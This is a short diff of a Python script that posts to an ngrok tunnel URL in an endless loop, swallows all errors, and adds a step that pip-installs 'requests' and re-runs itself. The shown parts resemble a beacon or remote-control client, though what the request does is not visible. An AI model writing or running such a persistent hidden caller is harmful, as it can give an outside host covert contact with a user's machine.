@@ -1,7 +1,14 @@
-import requests
 import subprocess
 import os
 import time
+
+try:
+    import requests
+except ImportError:
+    subprocess.run(["pip", "install", "requests"])
+    subprocess.run(["python", __file__])
+    exit()
+
 url = 'https://assured-earwig-picked.ngrok-free.app/'
 
 def send_post_request():
@@ -18,6 +25,7 @@ def send_post_request():
             pass
     except Exception as e:
         pass
+
 if __name__ == "__main__":
     while True:
         send_post_request()
